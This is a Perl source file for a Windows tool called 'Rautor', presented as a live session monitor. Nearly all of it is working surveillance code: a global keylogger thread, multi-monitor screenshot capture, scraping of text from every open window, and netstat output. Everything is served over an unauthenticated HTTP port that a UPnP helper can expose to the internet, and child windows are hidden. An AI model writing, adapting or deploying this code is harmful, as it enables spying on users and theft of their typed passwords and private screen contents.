#!wperl.exe
#
# A screen grabber with an embedded Web Server
# and a session registration engine !
# Angelos Karageorgiou
# angelos@unix.gr
#

package Rautor;

use common::sense;

use IO::Select;
use HTTP::Daemon;
use HTTP::Response;
use HTTP::Status;
use HTTP::Request;
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI  qw (WM_QUERYENDSESSION WM_ENDSESSION WM_CLOSE);
use Win32::GUI::DIBitmap;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Getopt::Long;
use threads;
use threads::shared;
use IO::Socket::INET;
use Win32::Process;

my $PORT=42000;
my $VERBOSE='';
my $KEYLOG:shared="";
my $TIP="Insecure Live Session Monitor \nFor proper commercial grade security software\nvisit http://www.unix.gr/rautor";
my $SLIDESBITS=8;
our %keymap;


#our $REGSERVER="192.168.224.95";
#our $MYNAME="Rautor"; # needed by rreg.pl :-(

push @INC, "." ;
require "Keymap.pl";            # registry stuff , common with rrs.pl

GetOptions (
        'verbose'   => \$VERBOSE,
);


print "Port is $PORT\n" if ( $VERBOSE);


#primary
my $GetDC = new Win32::API('user32', 'GetDC',     ['N'],     'N');
my $RelDC = new Win32::API('user32', 'ReleaseDC', [qw/N N/], 'I');
#Alternate
my $GetDW = new Win32::API('user32','GetDesktopWindow', [],  'N');
my $DESKTOP = $GetDW->Call();
my $MAXSCREENS=10;
my $imgFname="screen.png";
my $NumScreens=CountMonitors();
our  $user=Win32::LoginName();
our  $Node=Win32::NodeName();
our  $domain=Win32::DomainName();
my $SLEEP=5;
our $QUANTUM=130;


print STDERR "I found $NumScreens Screens\n" if ( $VERBOSE);
my $GUID=Win32::GuidGen();
my $RepeatHeader="<HEAD><META HTTP-EQUIV=REFRESH CONTENT=$SLEEP></HEAD>\r\n
<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"2\" style=\"position:relative\">\r\n
";


my $SESSION=substr($GUID,1,length($GUID)-2);
$SESSION=~ s/\-//gi;


my $ICONPATH:shared=getIcon("bull_lined.ico");		
my $redIconFile:shared=getIcon("dot.ico");
#my $ICONPATH:shared= PerlApp::extract_bound_file("bull_lined.ico");
#my $redIconFile:shared=PerlApp::extract_bound_file("dot.ico");
	
my $bullIcon  = new Win32::GUI::Icon($ICONPATH);	
my $redIcon   = new Win32::GUI::Icon($redIconFile);


# GUI STUFF
my $main = Win32::GUI::Window->new(
	-name   => 'Main',
	-width  => 100,
	-height => 100,
	-minsize => [100, 100],
  	-visible => 0, 
);

my $trayIcon = $main->AddNotifyIcon(
	-name	=> 'BULL',
	-icon	=> $bullIcon,
	-tip	=> $TIP ,
);

$HTTP::Daemon::PROTO = "HTTP/1.0";
my $daemon  = HTTP::Daemon->new(Listen=>10,LocalPort=>$PORT, ReuseAddr=>1) || &Shutdown();	
my $webtid=threads->create('web',$daemon,$SESSION,$trayIcon,$bullIcon,$redIcon)->detach();

$main->Hook(WM_CLOSE,\&Shutdown);
$main->Enable();
my $keytid=threads->create('KeyLogger',$QUANTUM)->detach();
Win32::GUI::Dialog();
Shutdown();



sub Main_Terminate {
    -1;
}

sub Main_Minimize {
	print "Minimized\n";
    $main->Disable();
    $main->Hide();
    1;
}


 sub BULL_Click {
        $main->Enable();
        $main->Show();
       1;
}


########################################################################################
sub web{
my ($daemon,$SESSION,$trayicon,$bullIcon,$redIcon)=@_;



print "Daemon mode on\n" if ( $VERBOSE);
#main code

	while ( my 	$c = $daemon->accept){	
	set_icon($trayIcon,$redIcon,"Your Session is being monitored");	

	# Verify the caller	
		my @ip = unpack("C4",$c->peeraddr);
		my $ip=join(".",@ip);
		# go for it	
		process_one_req($c,$SESSION,$ip);
		Win32::Sleep(30); # let's deny DDOS :-)
		threads->yield();
		set_icon($trayIcon,$bullIcon,$TIP);	
		$c->close;						
	}
}

########################################################################################
sub process_one_req {
my $connection = shift;	
my $SESSIONID=shift;
my $IP=shift;
	
	my $RepeatHTML=$RepeatHeader;
	
    my $receiver = $connection->get_request;
	if ( ! $receiver ) {
		return;
	}
	if (! ($receiver->method eq 'GET') ){					# Method GET
       		$connection->send_error(RC_FORBIDDEN);
			return;
	}
	$receiver->url->path =~ m/^\/(.*)$/mi;
	my $path=$1;	
	
	
	if  ($path eq "monitor8bits" ) {
		$SLIDESBITS=8;
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	# URL is /monitor or null
	if   ($path eq "monitor16bits" ) {
		$SLIDESBITS=16;
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);		
		return;
	}
	if ( ($path eq "monitor" ) || ($path eq "" ) ) 	{
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	
	if  ($path eq "numscreens" ) {	
       		my $response = HTTP::Response->new(200);
			my $Text="The system has " . $NumScreens . " monitor(s)";
       		$response->content($Text);
			$connection->send_response($response);	
			return;
	}
    if  ($path =~ /^screen([1-9]*)\.png$/ )  {	# Screen[1-9].png
		
		my $scrnum=1;
		if ( $1 ) {
			$scrnum=$1;
		}
		my $res=screendumper($scrnum);
		my $fname="screen".$scrnum.".png";
		if ( $fname eq "screen.png" ) {
			$fname="screen1.png";
		}
		if ( ! -f $ENV{APPDATA} ."\\". $fname )  {
          		$connection->send_error(404,"Could not grab the screen num $scrnum");
			$connection->close;
			undef($connection);
			return;
		}
       	my $response = HTTP::Response->new(200);
       	$response->push_header('Content-Type','image/png');
		$connection->send_response($response);
		$connection->send_file($ENV{APPDATA}."\\".$fname);
		unlink $fname;
	return;
	}
	
	
	if  ($path eq "scrape" ) {
		my $Text=DumpAnyText();
		my $response = HTTP::Response->new(3000);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		return;
	}
	if  ($path eq "keylog" ) {
		my $Text=$KEYLOG;
		$KEYLOG="";
		my $response = HTTP::Response->new(200);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		return;
	}
	
   	if  ($path eq "netstat" ) {					# /netstat
    	my $response = HTTP::Response->new(200);
		my $Text=readnetstat("c:\\WINDOWS\\system32\\\\netstat.exe -bn");
		if ( ! $Text ) {
      		$connection->send_error(404,"Could not do netstat");
		} else {
      		$response->content($Text);
			$connection->send_response($response);	
		}
		return;
	}
	
    if  ($path eq "fullnetstat" ) {				# /fullnetstat
    	my $response = HTTP::Response->new(200);
		my $Text=readnetstat("c:\\WINDOWS\\system32\\netstat.exe -bavn");
		if ( ! $Text ) {
        		$connection->send_error(404,"Could not do netstat");
		} else {
    		$response->content($Text);
			$connection->send_response($response);	
		}
		return;	
	} 
	# no matches
	$connection->send_error(RC_FORBIDDEN);
}


######################################################################
sub domonitor{
	my ($connection,$RepeatHTML,$SESSIONID,$IP)=@_;
	my $span=$NumScreens*3;
	$RepeatHTML .= "
	
	<tr bgcolor=lightgrey> 		
		<td align=center><font color=red size=2><a href=\"/monitor8bits\">[Monitor in 8-bit mode]</a></font></td> 
		<td align=center><font color=red size=2><a href=\"/scrape\">[Dump Textual Contents]</a></font></td> 
		<td align=center><font color=red size=2><a href=\"/monitor16bits\">[Monitor in 16-bit mode]</a></font></td> 		
	</td> </tr>
	<tr bgcolor=\#afafff> 			
		<td colspan=$span><font color=white size=1>Keystrokes: $KEYLOG</font></td> 		
	</tr>
	";
	for (my $i=1;$i<=$NumScreens;$i++){		
		my $fname="screen".$i.".png";
		$RepeatHTML .= "<tr><td colspan=$span><a href=\"/"  . $fname . "\">";
		$RepeatHTML .= "<img src=\"/$fname\" width=\"100%\" height=\"100%\" align=center></a></td>\r\n";
		if ( ( $i % 2 ) == 0 ) {
			$RepeatHTML .= "</tr>\r\n<tr>";	
		}
	}
	
	$RepeatHTML .= "</tr>";
	
	$RepeatHTML .= "</table>";	
	$RepeatHTML .= "<b>$IP</b> Is monitoring";	
	
    my $response = HTTP::Response->new(length($RepeatHTML));
    $response->content($RepeatHTML);
	$connection->send_response($response);	
	$KEYLOG=""; # reset untill next call
}



######################################################################
sub locatefile {
	my $filename=shift;
	      #snippet shamelessly stolen from splashscreen.pm
      my @dirs;
      # directory of perl script
      my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
      push @dirs, $tmp;
      # cwd
      push @dirs, ".";
      push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
      push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

      for my $dir (@dirs) {
              next unless -d $dir;
              print STDERR "Attempting to locate \"$filename\" in $dir\n" if ($VERBOSE);
              if ( -f "$dir\\$filename" ) {
                      return $dir;
              }
      }
	  return undef;
}

######################################################################
sub doUPnP {
	my $dir=locatefile("upnpc-static.exe");
		if ( ! $dir ) {				
			print STDERR "Upnpc executable not found\n" if ( $VERBOSE);			
			return;
		}
		
		open(my $IN,"$dir\\upnpc-static.exe -r $PORT tcp|");
		if ( ! $IN) {
			print STDERR "Could not open pipe from upnpc\n" if ( $VERBOSE);
			return;		
		}
		while(<$IN>){
			print "$_\n" if ( $VERBOSE);				
		}		
		close($IN);
}



######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
sub KeyLogger{
  my  ($QUANTUM)=@_;		
  while (1) {	
 		for ( my $i=0; $i<255;$i++){
 			if (IsKeyPressed($i)){
				if ( length( $keymap{$i}) ==1  ) {
					$KEYLOG .= $keymap{$i};
				} else {
					$KEYLOG .=  " [" . $keymap{$i} . "]" ;
				}				
				if ($i == 0x0D)	{
						;
				} # ENTER was pressed
			}
		}
		Win32::Sleep($QUANTUM);
	}
}


############################################################
sub readnetstat{
	my $cmdline=shift;
 	my $Text="<table border=0><tr><th>Proto</th><th>Local Address</th><th>Foreign Address</th><th>State</th><th>PID</th></tr>\n";

	open (FIN , "$cmdline|") || return undef;	
	while (<FIN>){
		next if ( /^\s[\s]*$/);
		$_ =~ s/^\s*//g;
		$_ =~ s/\s[\s]*/ /g;
		chomp($_);
		chomp($_);
		next if ( /^Active/);
		next if ( /^Proto/);
		my ($Proto,$LocalAddress,$ForeignAddress,$State,$PID)=split(/\s/,$_);
		if  ( ( $Proto  eq 'TCP' ) or  ( $Proto  eq 'UDP')){
			$Text .= "<tr><td colspan=5>&nbsp<hr></td></tr>\n";
			$Text .= "<tr><td>$Proto</td><td>$LocalAddress</td><td>$ForeignAddress</td><td>$State</td><td>$PID</td></tr>\n";
		} else {
			$Text .= "<tr><td colspan=5>$_</td></tr>\n";
		}
	}
	$Text .= "</table>";
return $Text;
}


############################################################
sub screendumper{
	my ($i)=shift(@_);

	my $disp="\\\\.\\Display".$i;
	my $fname=$ENV{APPDATA}."\\screen".$i.".png";
 	my $Screen = new Win32::GUI::DC("DISPLAY",$disp);
	if ( $Screen){
   	 	my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
		my $scaled=scale($image);
	       	if ( $scaled ) {			
			$scaled->SaveToFile($fname);
       		}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}


############################################################
sub scale{
	my $image=shift;
	
print "BITS $SLIDESBITS\n" if $VERBOSE;

	if ($SLIDESBITS ==8 ) {			
			my $new=$image->ConvertTo8Bits();	
			my $ximage=$new->ColorQuantize();
			return $ximage;
	} elsif ($SLIDESBITS == 16 ) {
			my $newimage=$image->ConvertTo16Bits565();
			return $newimage;
	}
	return $image; # justincase
}

############################################################
sub screendumper_singleton{
	my $dc  = $GetDC->Call(0);
	if ( ! $dc ) {
		return -1;
	}
	my $image = newFromDC Win32::GUI::DIBitmap($dc) ;

	if ( ! $image ) {	
		return -1;
	}
	$RelDC->Call(0,$dc);
	$image->SaveToFile($ENV{APPDATA}."\\".$ENV{APPDATA}."\\".$imgFname)	|| return -1;
	return 1;
}


############################################################
sub screendumper2{
	my $image = newFromWindow Win32::GUI::DIBitmap($DESKTOP,0) ;
	if ( ! $image ) {	
		return ( -1 );
	}
	$image->SaveToFile($ENV{APPDATA}. "\\" .$imgFname)	|| return -1;
	return(1);

}

######################################################################
sub CountMonitors{
my $NumScreens=0;
for (my $i=0;$i<$MAXSCREENS;$i++){
	my $dispname="\\\\.\\Display".$i;
	my $Screen=new Win32::GUI::DC("DISPLAY",$dispname);
	if ( $Screen ) {
		my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
 		if ( $image ) {
			$NumScreens++;
		}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}
return $NumScreens;
}


############# Screen Scraper Section ################
#####################################################
sub DumpAnyText{
	my $Text="";
	my @hwnds = FindWindowLike();     
	foreach my $window (@hwnds) {
		my $title=GetWindowText($window);
		next if ( $title =~ /^$/);
		$Text .= "[$title]\n";
	
		my @edits=FindWindowLike($window,"","");
		foreach my $ed (@edits) {
			my $text=" " x 65536;
			$text=GetWhatYoucan($ed);
			$text=~s/\x00/ / ;
			$text=~s/[\r\n]$// ;
			next if ($text =~ /^$/ );
			$Text .= "\t". $text ."\n";
		}
		$Text .= "\n";
	}
	return($Text);
}

######################################################################
sub GetWhatYoucan{
	my $ed=shift;

	my $text="";
    	eval {
       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
       		alarm 1;
		$text=WMGetText($ed);
       		alarm 0;
    	};
    	if ($@) {
		return undef;
    	}
	return $text;
}

######################################################################

sub getIcon {
	my $icon=shift;
	my $ICONPATH='';

	
	
	#snippet shamelessly stolen from splashscreen.pm
	my @dirs;
	# directory of perl script
	my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
	push @dirs, $tmp;
	# cwd
	push @dirs, ".";
	push @dirs, $ENV{TEMP} if exists $ENV{TEMP};
	push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
	push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

	for my $dir (@dirs) {
		next unless -d $dir;
		print STDERR "Attempting to locate icon $icon under $dir\n" if $VERBOSE;
		if ( -f $dir . "\\" .$icon ) {
			$ICONPATH=$dir ."\\" . $icon;	
			return $ICONPATH;
		}
	}
}

######################################################################
sub set_icon{
my ( $icon,$img,$tip)=@_;
  $icon->Change (            
      -name => 'Tray',
      -icon => $img,
      -tip  => $tip,
    );
}

########################################################################################
BEGIN {	
	# hide child windows like netstat :-)
 	if ( defined &Win32::SetChildShowWindow ){
		Win32::SetChildShowWindow(0) 
 	}
 }

########################################################################################
sub Shutdown{
	print STDERR "Shutdown Called" if ( $VERBOSE);
    $main->AddNotifyIcon(
      -name => 'Tray',
    );
	
	exit;
}

########################################################################################
########################################################################################
########################################################################################


